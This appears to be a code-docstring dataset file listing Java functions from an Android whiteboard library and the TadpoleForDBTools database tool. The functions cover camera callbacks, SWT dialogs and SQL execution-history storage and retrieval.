{"docstring": "/**\n * show \u65b0\u5efa\u4e00\u4e2a\u6559\u5e08\u7aef\u7684\u753b\u677f\u788e\u7247\uff0c\u6709\u63a8\u9001\u6309\u94ae\n * @param callback \u63a8\u9001\u6309\u94ae\u76d1\u542c\u5668\uff0c\u63a5\u53d7\u8fd4\u56de\u7684\u56fe\u7247\u6587\u4ef6\u8def\u5f84\u53ef\u7528\u4e8e\u663e\u793a\u6587\u4ef6\n * @author TangentLu\n * create at 16/6/17 \u4e0a\u53489:57\n */\n", "func_signal": "public static WhiteBoardFragment newInstance(SendBtnCallback callback)", "code": "{\n    WhiteBoardFragment fragment = new WhiteBoardFragment();\n    fragment.sendBtnCallback = callback;\n    fragment.isTeacher = true;\n    return fragment;\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\fragment\\WhiteBoardFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u62cd\u7167\u6210\u529f\u540e\u7684\u56de\u8c03\n * @param requestCode\n * @param resultCode\n * @param data\n */\n", "func_signal": "@Override\npublic void onActivityResult(int requestCode, int resultCode, Intent data)", "code": "{\n    super.onActivityResult(requestCode, resultCode, data);\n    if (requestCode == REQUEST_CAMERA) {\n        if (resultCode == Activity.RESULT_OK) {\n            if (mTmpFile != null) {\n                if(mRequestType==WhiteBoardFragment.REQUEST_IMAGE) {//\u5982\u679c\u662f\u62cd\u7167\u4f5c\u4e3a\u753b\u677f\u7d20\u6750\u7684\u8bdd\n                    cropPhoto(Uri.fromFile(mTmpFile));// \u88c1\u526a\u56fe\u7247\n                }else if(mRequestType==WhiteBoardFragment.REQUEST_BACKGROUND) {//\u62cd\u7167\u4f5c\u4e3a\u753b\u677f\u80cc\u666f\n                    if (mCallback != null) {\n                        mCallback.onCameraShot(mTmpFile);\n                    }\n                }\n            }\n        } else {\n            // delete tmp file\n            Toast.makeText(getActivity(),\"\u62cd\u7167\u5931\u8d25,\u8bf7\u91cd\u65b0\u62cd\u7167\",Toast.LENGTH_SHORT).show();\n            while (mTmpFile != null && mTmpFile.exists()) {\n                boolean success = mTmpFile.delete();\n                if (success) {\n                    mTmpFile = null;\n                }\n            }\n        }\n    } else if (requestCode == REQUEST_CROP) {\n        if (resultCode == Activity.RESULT_OK) {\n            if (data != null) {\n                Bundle extras = data.getExtras();\n                Bitmap bitmap = extras.getParcelable(\"data\");\n                dealWithBitmap(bitmap);//\u88c1\u526a\u56fe\u7247\u540e\u7684\u64cd\u4f5c\n\n            }\n\n        }\n    }\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorFragment.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \u8bbe\u7f6eactivity\u7684\u5c3a\u5bf8\u4ee5\u53ca\u5728\u5c4f\u5e55\u4e0a\u7684\u4f4d\u7f6e\n *\n * @param orientation\n */\n", "func_signal": "private void setActivitySize(int orientation)", "code": "{\n    Intent intent = getIntent();\n    int[] bounds = intent.getIntArrayExtra(EXTRA_BOUNDS);\n    WindowManager.LayoutParams p = getWindow().getAttributes();  //\u83b7\u53d6\u5bf9\u8bdd\u6846\u5f53\u524d\u7684\u53c2\u6570\u503c\n    if (orientation == Configuration.ORIENTATION_LANDSCAPE) {//\u6a2a\u5c4f\n        p.x = bounds[0] + bounds[2] / 2;\n        p.y = bounds[1];\n        p.width = bounds[2] / 2;\n        p.height = bounds[3];\n    } else if (orientation == Configuration.ORIENTATION_PORTRAIT) {//\u7ad6\u5c4f\n        p.x = bounds[1];\n        p.y = bounds[1] + bounds[3] / 2;\n        p.width = bounds[2];\n        p.height = bounds[3] / 2;\n    }\n    getWindow().setGravity(Gravity.LEFT | Gravity.TOP);\n    getWindow().setAttributes(p);\n}", "path": "whiteboardlib\\src\\main\\java\\com\\yinghe\\whiteboardlib\\MultiImageSelectorActivity.java", "repo_name": "dsbGenius/WhiteBoard", "stars": 581, "license": "None", "language": "java", "size": 21885}
{"docstring": "/**\n * \ud2b8\ub9ac \ub370\uc774\ud130 \ucd08\uae30\ud654\n */\n", "func_signal": "public void init()", "code": "{\n\tif(logger.isDebugEnabled()) logger.debug(\"===== Manager Viewer init..............\");\n\tSessionManager.initManagerDBList();\n\tsetManagerDBList();\n}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\viewers\\connections\\ManagerViewer.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * Create contents of the dialog.\n * @param parent\n */\n", "func_signal": "@Override\nprotected Control createDialogArea(Composite parent)", "code": "{\n\tComposite container = (Composite) super.createDialogArea(parent);\n\tGridLayout gridLayout = (GridLayout) container.getLayout();\n\tgridLayout.numColumns = 2;\n\t\n\tLabel lblConnectionsPerHost = new Label(container, SWT.NONE);\n\tlblConnectionsPerHost.setText(\"Connections Per Host\");\n\t\n\ttextConnectionPerHost = new Text(container, SWT.BORDER);\n\ttextConnectionPerHost.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\t\n\tLabel lblBlockingThreadMultiplier = new Label(container, SWT.NONE);\n\tlblBlockingThreadMultiplier.setText(\"Blocking Thread Multiplier\");\n\t\n\ttextBlockingThreadMultiplier = new Text(container, SWT.BORDER);\n\ttextBlockingThreadMultiplier.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\t\n\tLabel lblMaxWaitTime = new Label(container, SWT.NONE);\n\tlblMaxWaitTime.setText(\"Max Wait Time\");\n\t\n\ttextMaxWiatTime = new Text(container, SWT.BORDER);\n\ttextMaxWiatTime.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\n\treturn container;\n}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\dialog\\dbconnect\\sub\\MongoDBConnectionPoolDialog.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * save execute history\n * \n * @param user_seq\n * @param userDB\n * @param reqResultDAO\n * @param te\n * @return\n */\n", "func_signal": "public static long insertExecuteHistory(final int user_seq, final UserDBDAO userDB, final RequestResultDAO reqResultDAO)", "code": "{\n\tlong longHistorySeq = -1;\n\t\n\tif(LicenseValidator.getLicense().isValidate()) {\n\t\ttry {\n\t\t\t\n\t\t\tlongHistorySeq = TadpoleSystem_ExecutedSQL.saveExecuteSQUeryResource(\n\t\t\t\t\t\t\tuser_seq, \n\t\t\t\t\t\t\tuserDB, \n\t\t\t\t\t\t\treqResultDAO\n\t\t\t\t\t\t\t);\n\t\t\n\t\t\t\n\t\t} catch(Exception e) {\n\t\t\tlogger.error(\"save the user query\", e); //$NON-NLS-1$\n\t\t}\n\t}\n\t\n\treturn longHistorySeq;\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "//$NON-NLS-1$\n", "func_signal": "public ObjectRenameAction(IWorkbenchWindow window, PublicTadpoleDefine.OBJECT_TYPE actionType, String title)", "code": "{\n\t\tsuper(window, actionType);\n\t\tsetId(ID + actionType.toString());\n\t\tsetText(title); //$NON-NLS-1$\n\t}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\actions\\object\\rdb\\object\\ObjectRenameAction.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * \ub9c8\uc9c0\ub9c9 \uc2e4\ud589\ud588\ub5a4 \ucffc\ub9ac 20\uac1c\ub97c \ub9ac\ud134\ud569\ub2c8\ub2e4.\n * \n * @param user_seq\n * @param dbSeq\n * @return\n * @throws TadpoleSQLManagerException, SQLException\n */\n", "func_signal": "public static List<RequestResultDAO> getExecuteQueryHistory(int user_seq, int dbSeq, String filter) throws TadpoleSQLManagerException, SQLException", "code": "{\n\tList<RequestResultDAO> returnSQLHistory = new ArrayList<RequestResultDAO>();\n\t\n\tMap<String, Object> queryMap = new HashMap<String, Object>();\n\tqueryMap.put(\"user_seq\",user_seq);\n\tqueryMap.put(\"db_seq\", \tdbSeq);\n\tqueryMap.put(\"filter\", \"%\" + filter + \"%\");\n\tqueryMap.put(\"count\", \t20);\n\t\n\tSqlMapClient sqlClient = TadpoleSQLManager.getInstance(TadpoleEngineUserDB.getUserDB());\n\tList<java.util.Map> listResourceData =  sqlClient.queryForList(\"getExecuteQueryHistory\", queryMap);\n\t\n\tfor (Map resultMap : listResourceData) {\n\t\tlong seq \t\t\t\t= (Long)resultMap.get(\"executed_sql_resource_seq\");\n\t\t\n\t\tLong startdateexecute \t= 0l;\n\t\t// This case sqlite\n\t\tif(resultMap.get(\"startdateexecute\") instanceof Long) {\n\t\t\tstartdateexecute = (Long)resultMap.get(\"startdateexecute\");\n\t\t// This case mysql\n\t\t} else {\n\t\t\tstartdateexecute = ((Timestamp)resultMap.get(\"startdateexecute\")).getTime();\n\t\t}\n\t\t\n\t\tString strHeadSQLText = StringUtils.trimToEmpty((String)resultMap.get(\"tdb_sql_head\"));\n\t\tString strSQLText \t\t= (String)resultMap.get(\"sql_data\");\n\t\tLong enddateexecute \t= 0l;\n\t\t// This case sqlite\n\t\tif(resultMap.get(\"enddateexecute\") instanceof Long) {\n\t\t\tenddateexecute = (Long)resultMap.get(\"enddateexecute\");\n\t\t// This case mysql\n\t\t} else {\n\t\t\tenddateexecute = ((Timestamp)resultMap.get(\"enddateexecute\")).getTime();\n\t\t}\n\t\t\n\t\tint tdb_result_code = 0;\n\t\tString strMessage \t\t= (String)resultMap.get(\"message\");\n\t\t\n\t\tint row \t\t\t= (Integer)resultMap.get(\"row\");\n\t\tString result \t\t= (String)resultMap.get(\"result\");\n\t\t\n\t\tint duration \t\t= (Integer)resultMap.get(\"duration\");\n\t\t\n\t\tRequestResultDAO dao \n\t\t\t= new RequestResultDAO(duration, new Timestamp(startdateexecute), strHeadSQLText, strSQLText, new Timestamp(enddateexecute), row, result, tdb_result_code, strMessage);\n\t\tdao.setSeq(seq);\n\t\treturnSQLHistory.add(dao);\n\t}\n\t\n\treturn returnSQLHistory;\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * popup \ud654\uba74\uc744 \uc624\ud508\ud569\ub2c8\ub2e4.\n */\n", "func_signal": "private void createPopupMenu()", "code": "{\n\tMenuManager menuMgr = new MenuManager();\n\tmenuMgr.add(new Separator(IWorkbenchActionConstants.MB_ADDITIONS));\n\t\n\tMenu popupMenu = menuMgr.createContextMenu(managerTV.getTree());\n\tmanagerTV.getTree().setMenu(popupMenu);\n\tgetSite().registerContextMenu(menuMgr, managerTV);\n}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\viewers\\connections\\ManagerViewer.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * tree\uc5d0 \uc0c8\ub85c\uc6b4 \ud56d\ubaa9 \ucd94\uac00\n * \n * @param userDB\n * @param defaultOpen default editor open\n */\n", "func_signal": "public void addUserDB(UserDBDAO userDB, boolean defaultOpen)", "code": "{\n\t\n\tfor(ManagerListDTO dto: treeDataList) {\n\t\tif(dto.getName().equals(userDB.getGroup_name())) {\n\t\t\tdto.addLogin(userDB);\n\t\t\t\n\t\t\tselectAndOpenView(dto, userDB, defaultOpen);\n\t\t\treturn;\n\t\t}\t// end if(dto.getname()....\t\t\n\t}\t// end for\n\t\n\t// \uc2e0\uaddc \uadf8\ub8f9\uc774\uba74...\n\tManagerListDTO managerDto = new ManagerListDTO(userDB.getGroup_name());\n\tmanagerDto.addLogin(userDB);\n\ttreeDataList.add(managerDto);\t\n\tselectAndOpenView(managerDto, userDB, defaultOpen);\n}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\viewers\\connections\\ManagerViewer.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * \ucffc\ub9ac \uc2e4\ud589 \ud788\uc2a4\ud1a0\ub9ac \ub514\ud14c\uc77c \ucc3d\uc744 \uc5bb\uc2b5\ub2c8\ub2e4.\n * \n * @param strEmail\n * @param strType\n * @param strResultType\n * @param dbSeq\n * @param startTime\n * @param endTime\n * @param duringExecute\n * @param strSearch\n * @param _indexStart\n * @param _indexEnd\n * @return\n * @throws TadpoleSQLManagerException\n * @throws SQLException\n */\n", "func_signal": "public static List<RequestResultDAO> getExecuteQueryHistoryDetail(String strEmail, String strType, String strResultType, String dbSeq, long startTime, long endTime, int duringExecute, String strSearch, int _indexStart, int _indexEnd) throws TadpoleSQLManagerException, SQLException", "code": "{\n\tif(!LicenseValidator.getLicense().isValidate()) {\n\t\treturn new ArrayList<RequestResultDAO>();\n\t}\n\t\n\tList<RequestResultDAO> returnSQLHistory = new ArrayList<RequestResultDAO>();\n\t\n\tMap<String, Object> queryMap = new HashMap<String, Object>();\n\tqueryMap.put(\"email\", \tstrEmail);\n\tif(!\"\".equals(dbSeq)) queryMap.put(\"db_seq\", \tdbSeq);\n\tif(!\"All\".equals(strType)) queryMap.put(\"type\", strType);\n\tif(!\"All\".equals(strResultType)) {\n\t\tqueryMap.put(\"tdb_result_code\", strResultType);\n\t}\n\t\n\tif(ApplicationArgumentUtils.isDBServer()) {\n\t\tDate date = new Date(TimeZoneUtil.chageTimeZone(startTime));\n\t\tDateFormat formatter = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n\t\tqueryMap.put(\"startTime\",  formatter.format(date));\n\t\t\n\t\tDate dateendTime = new Date(TimeZoneUtil.chageTimeZone(endTime));\n\t\tqueryMap.put(\"endTime\", formatter.format(dateendTime));\t\t\t\n\t} else {\n\t\tqueryMap.put(\"startTime\",  startTime);\n\t\tqueryMap.put(\"endTime\", endTime);\n\t}\n\t\n\tqueryMap.put(\"duration\", duringExecute);\n\tqueryMap.put(\"strSearch\", strSearch);\n\tqueryMap.put(\"_indexStart\", _indexStart);\n\tqueryMap.put(\"_indexEnd\", _indexEnd);\n\t\n\tSqlMapClient sqlClient = TadpoleSQLManager.getInstance(TadpoleEngineUserDB.getUserDB());\n\tList<java.util.Map> listResourceData =  new ArrayList<Map>();\n\t\n\tif(\"All\".equals(strType)) {\n\t\tlistResourceData = sqlClient.queryForList(\"getExecuteQueryHistoryDetail\", queryMap);\n\t\t\n\t\tqueryMap.put(\"type\", PublicTadpoleDefine.EXECUTE_SQL_TYPE.API.name());\n\t\tlistResourceData.addAll(sqlClient.queryForList(\"getExecuteQueryHistoryAPIDetail\", queryMap));\n\t} else {\n\t\tif(PublicTadpoleDefine.EXECUTE_SQL_TYPE.API.name().endsWith(strType)) {\n\t\t\tlistResourceData = sqlClient.queryForList(\"getExecuteQueryHistoryAPIDetail\", queryMap);\t\t\t\n\t\t} else {\n\t\t\tlistResourceData = sqlClient.queryForList(\"getExecuteQueryHistoryDetail\", queryMap);\n\t\t}\n\t}\n\t\n\tfor (Map resultMap : listResourceData) {\n\t\tlong seq = (Long)resultMap.get(\"executed_sql_resource_seq\");\n\t\t\n\t\tLong startdateexecute = 0l;\n\t\tString strHeadSQLText = StringUtils.trimToEmpty((String)resultMap.get(\"tdb_sql_head\"));\n\t\tString strSQLText = (String)resultMap.get(\"sql_data\");\n\t\tLong enddateexecute = 0l;\n\t\t\n\t\tif(ApplicationArgumentUtils.isDBServer()) {\n\t\t\tstartdateexecute = ((Timestamp)resultMap.get(\"startdateexecute\")).getTime();\n\t\t\tenddateexecute \t= ((Timestamp)resultMap.get(\"enddateexecute\")).getTime();\n\t\t} else {\n\t\t\tstartdateexecute = (Long)resultMap.get(\"startdateexecute\");\n\t\t\tenddateexecute = (Long)resultMap.get(\"enddateexecute\");\n\t\t}\n\t\t\n\t\tint row = (Integer)resultMap.get(\"row\");\n\t\tString result = (String)resultMap.get(\"result\");\n\t\t\n\t\tString userName =  resultMap.get(\"name\") == null?\"\":(String)resultMap.get(\"name\");\n\t\tString userEmail = resultMap.get(\"email\") == null?\"\":(String)resultMap.get(\"email\");\n\t\tString strFullName = \"\".equals(userEmail)?\"\":userName+\"(\"+ userEmail+\")\";\n\t\t\n\t\tString dbName = (String) resultMap.get(\"display_name\");\n\t\t\n\t\tString ipAddress = (String) resultMap.get(\"ipaddress\");\n\t\tint dbSeq2 = (Integer) resultMap.get(\"dbseq\");\n\t\t\n\t\tint tdb_result_code = 0;\n\t\tString strMessage = (String)resultMap.get(\"message\");\n\t\tint duration = (Integer) resultMap.get(\"duration\");\n\t\tString strDescription = (String)resultMap.get(\"description\");\n\t\t\n\t\tString strResultSaveYn = (String)resultMap.get(\"result_save_yn\");\n\n\t\tRequestResultDAO dao = new RequestResultDAO(\n\t\t\t\tduration,strFullName, dbName, new Timestamp(startdateexecute), \n\t\t\t\tstrHeadSQLText, strSQLText, new Timestamp(enddateexecute), row, result, tdb_result_code, strMessage,\n\t\t\t\tipAddress, dbSeq2, strDescription);\n\t\tdao.setSeq(seq);\n\n\t\tString strExecuteType = (String)resultMap.get(\"types\");\n\t\tdao.setEXECUSTE_SQL_TYPE(PublicTadpoleDefine.EXECUTE_SQL_TYPE.valueOf(strExecuteType));\n\t\tdao.setResult_save_yn(strResultSaveYn);\n\t\t\n\t\treturnSQLHistory.add(dao);\n\t}\n\t\n\treturn returnSQLHistory;\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * insert execute sql result data \n * \n * @param seq\n * @param startDateExecute\n * @param contents\n * @throws TadpoleSQLManagerException, SQLException\n */\n", "func_signal": "public static void insertResourceResultData(final long seq, final Timestamp startDateExecute, final String contents) throws TadpoleSQLManagerException, SQLException", "code": "{\n\tSqlMapClient sqlClient = TadpoleSQLManager.getInstance(TadpoleEngineUserDB.getUserDB());\n\t\n\t// content data\ub97c \uc800\uc7a5\ud569\ub2c8\ub2e4.\n\tExecutedSQLResultDataDAO dataDao = new ExecutedSQLResultDataDAO();\n\tdataDao.setExecuted_sql_resource_seq(seq);\n\tdataDao.setStartDateExecute(startDateExecute);\n\tdataDao.setResult_data(contents);\n\t\n\tsqlClient.insert(\"InsertExecuteSQLResultData\", dataDao); //$NON-NLS-1$\t\t\t\t\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * Create contents of the button bar.\n * @param parent\n */\n", "func_signal": "@Override\nprotected void createButtonsForButtonBar(Composite parent)", "code": "{\n\tcreateButton(parent, IDialogConstants.OK_ID,  CommonMessages.get().Add, true);\n\tcreateButton(parent, IDialogConstants.CANCEL_ID,   CommonMessages.get().Cancel, false);\n}", "path": "com.hangum.tadpole.rdb.core\\src\\com\\hangum\\tadpole\\rdb\\core\\dialog\\dbconnect\\sub\\MongoDBConnectionPoolDialog.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * Create contents of the dialog.\n * @param parent\n */\n", "func_signal": "@Override\nprotected Control createDialogArea(Composite parent)", "code": "{\n\tComposite container = (Composite) super.createDialogArea(parent);\n\tGridLayout gridLayout = (GridLayout) container.getLayout();\n\tgridLayout.verticalSpacing = 5;\n\tgridLayout.horizontalSpacing = 5;\n\tgridLayout.marginHeight = 5;\n\tgridLayout.marginWidth = 5;\n\t\n\tComposite compositeHead = new Composite(container, SWT.NONE);\n\tcompositeHead.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\tcompositeHead.setLayout(new GridLayout(2, false));\n\t\n\tLabel lblDate = new Label(compositeHead, SWT.NONE);\n\tlblDate.setText(\"Date\");\n\t\n\ttextDate = new Text(compositeHead, SWT.BORDER);\n\ttextDate.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\t\n\tLabel lblDbName = new Label(compositeHead, SWT.NONE);\n\tlblDbName.setText(\"DB Name\");\n\t\n\ttextDBName = new Text(compositeHead, SWT.BORDER);\n\ttextDBName.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\t\n\tLabel lblTitle = new Label(compositeHead, SWT.NONE);\n\tlblTitle.setText(\"Title\");\n\t\n\ttextTitle = new Text(compositeHead, SWT.BORDER);\n\ttextTitle.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\t\n\tLabel lblDescription = new Label(compositeHead, SWT.NONE);\n\tlblDescription.setText(\"Description\");\n\t\n\ttextDescription = new Text(compositeHead, SWT.BORDER | SWT.WRAP | SWT.V_SCROLL | SWT.MULTI);\n\tGridData gd_textDescription = new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1);\n\tgd_textDescription.heightHint = 40;\n\tgd_textDescription.minimumHeight = 40;\n\ttextDescription.setLayoutData(gd_textDescription);\n\t\n\tLabel lblAdvice = new Label(compositeHead, SWT.NONE);\n\tlblAdvice.setText(\"Advice\");\n\t\n\ttextAdvice = new Text(compositeHead, SWT.BORDER);\n\tGridData gd_textAdvice = new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1);\n\tgd_textAdvice.heightHint = 40;\n\tgd_textAdvice.minimumHeight = 40;\n\ttextAdvice.setLayoutData(gd_textAdvice);\n\t\n\tLabel lblValue = new Label(compositeHead, SWT.NONE);\n\tlblValue.setText(\"System Message\");\n\t\n\ttextSystemDescription = new Text(compositeHead, SWT.BORDER);\n\ttextSystemDescription.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));\n\t\n\tGroup grpResultset = new Group(container, SWT.NONE);\n\tgrpResultset.setLayout(new GridLayout(1, false));\n\tgrpResultset.setLayoutData(new GridData(SWT.FILL, SWT.FILL, true, true, 1, 1));\n\tgrpResultset.setText(\"Query Result\");\n\t\n\ttextMessage = new Text(grpResultset, SWT.BORDER | SWT.WRAP | SWT.H_SCROLL | SWT.V_SCROLL | SWT.CANCEL | SWT.MULTI);\n\ttextMessage.setLayoutData(new GridData(SWT.FILL, SWT.FILL, true, true, 1, 1));\n\t\n//\t\tGroup grpUserConformMessage = new Group(container, SWT.NONE);\n//\t\tGridData gd_grpUserConformMessage = new GridData(SWT.FILL, SWT.FILL, true, false, 1, 1);\n//\t\tgd_grpUserConformMessage.heightHint = 50;\n//\t\tgrpUserConformMessage.setLayoutData(gd_grpUserConformMessage);\n//\t\tgrpUserConformMessage.setText(\"User Conform Message\");\n//\t\tgrpUserConformMessage.setLayout(new GridLayout(1, false));\n//\t\t\n//\t\ttextUserConfirmMsg = new Text(grpUserConformMessage, SWT.BORDER | SWT.WRAP | SWT.H_SCROLL | SWT.V_SCROLL | SWT.CANCEL | SWT.MULTI);\n//\t\ttextUserConfirmMsg.setLayoutData(new GridData(SWT.FILL, SWT.FILL, true, true, 1, 1));\n\t\n\tinitUI();\n\t\n\t// shell\uc744 \uc624\ub978\ucabd \ud558\ub2e8\uc5d0 \ub193\uc744\uc218 \uc788\ub3c4\ub85d \ud569\ub2c8\ub2e4.\n\tShell mainShell = PlatformUI.getWorkbench().getActiveWorkbenchWindow().getShell();\n\tint x = mainShell.getSize().x;\n\tint y = mainShell.getSize().y;\n\t\n\tcontainer.getShell().setSize(450, 442);\n\t// \ud604\uc7ac shell location\n\tcontainer.getShell().setLocation(x - 450, y - 442);\n\n\treturn container;\n}", "path": "com.hangum.tadpole.monitoring.core\\src\\com\\hangum\\tadpole\\monitoring\\core\\dialogs\\monitoring\\ResultSetViewDialog.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * save execute history\n * \n * @param user_seq\n * @param userDB\n * @param reqResultDAO\n * @param rsDAO\n * @return\n */\n", "func_signal": "public static long insertExecuteHistory(final int user_seq, final UserDBDAO userDB, final RequestResultDAO reqResultDAO, final QueryExecuteResultDTO rsDAO)", "code": "{\n\tlong longHistorySeq = -1;\n\t\n\tif(LicenseValidator.getLicense().isValidate()) {\n\t\ttry {\n\t\t\t\n\t\t\tif(rsDAO != null) {\n\t\t\t\tif(PublicTadpoleDefine.YES_NO.YES.name().equals(rsDAO.getUserDB().getIs_result_save())) {\n\t\t\t\t\treqResultDAO.setResultData(CSVExpoter.makeContent(true, rsDAO, ',', \"UTF-8\"));\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tlongHistorySeq = TadpoleSystem_ExecutedSQL.saveExecuteSQUeryResource(\n\t\t\t\t\t\t\tuser_seq, \n\t\t\t\t\t\t\tuserDB, \n\t\t\t\t\t\t\treqResultDAO\n\t\t\t\t\t\t\t);\n\t\t\n\t\t\t\n\t\t} catch(Exception e) {\n\t\t\tlogger.error(\"save the user query\", e); //$NON-NLS-1$\n\t\t}\n\t}\n\t\n\treturn longHistorySeq;\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * initialize ui\n */\n", "func_signal": "private void initUI()", "code": "{\n\ttry {\n\t\ttextDate.setText(dao.getCreate_time().toString());\n\t\ttextDBName.setText(dao.getUserDB().getDisplay_name());\n\t\ttextTitle.setText(dao.getMonitoringIndexDAO().getTitle());\n\t\ttextDescription.setText(dao.getMonitoringIndexDAO().getDescription());\n\t\ttextAdvice.setText(dao.getMonitoringIndexDAO().getAdvice());\n\t\ttextSystemDescription.setText(dao.getSystem_description());\n\t\t\n\t\ttextMessage.setText(JSONUtil.getPretty(dao.getQuery_result()));\n\t} catch(Exception e) {\n\t\tlogger.error(\"server status\", e); //$NON-NLS-1$\n\t}\n}", "path": "com.hangum.tadpole.monitoring.core\\src\\com\\hangum\\tadpole\\monitoring\\core\\dialogs\\monitoring\\ResultSetViewDialog.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * execute query\n * \n * @param seq\n * @return\n * @throws TadpoleSQLManagerException\n * @throws SQLException\n */\n", "func_signal": "public static List<ExecutedSQLResultDataDAO> getExecuteResultData(long seq) throws TadpoleSQLManagerException, SQLException", "code": "{\n\tSqlMapClient sqlClient = TadpoleSQLManager.getInstance(TadpoleEngineUserDB.getUserDB());\n\t\n\treturn sqlClient.queryForList(\"getExecuteResultData\", seq);\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * Create contents of the button bar.\n * @param parent\n */\n", "func_signal": "@Override\nprotected void createButtonsForButtonBar(Composite parent)", "code": "{\n\tcreateButton(parent, intBtnSnapshotID, \"View Snapshot\", false);\n//\t\tcreateButton(parent, intBtnUserConfirmID, \"User Confirm\", false);\n\tcreateButton(parent, IDialogConstants.OK_ID, \"Close\", true);\n}", "path": "com.hangum.tadpole.monitoring.core\\src\\com\\hangum\\tadpole\\monitoring\\core\\dialogs\\monitoring\\ResultSetViewDialog.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
{"docstring": "/**\n * insert execute sql data\n * \n * @param seq\n * @param startDateExecute\n * @param tdb_sql_head\n * @param sql_text \n * @throws TadpoleSQLManagerException, SQLException\n */\n", "func_signal": "private static void insertResourceSQLData(final long seq, final Timestamp startDateExecute, final String tdb_sql_head, String sql_text) throws TadpoleSQLManagerException, SQLException", "code": "{\n\tSqlMapClient sqlClient = TadpoleSQLManager.getInstance(TadpoleEngineUserDB.getUserDB());\n\t\n\t// content data\ub97c \uc800\uc7a5\ud569\ub2c8\ub2e4.\n\tExecutedSqlResourceDataDAO dataDao = new ExecutedSqlResourceDataDAO();\n\tdataDao.setExecuted_sql_resource_seq(seq);\n\tdataDao.setStartDateExecute(startDateExecute);\n\tdataDao.setTdb_sql_head(tdb_sql_head);\n\tdataDao.setSql_data(sql_text);\n\t\n\tsqlClient.insert(\"userExecuteSQLResourceDataInsert\", dataDao); //$NON-NLS-1$\t\t\t\t\n}", "path": "com.hangum.tadpole.engine\\src\\com\\hangum\\tadpole\\engine\\query\\sql\\TadpoleSystem_ExecutedSQL.java", "repo_name": "hangum/TadpoleForDBTools", "stars": 541, "license": "None", "language": "java", "size": 200269}
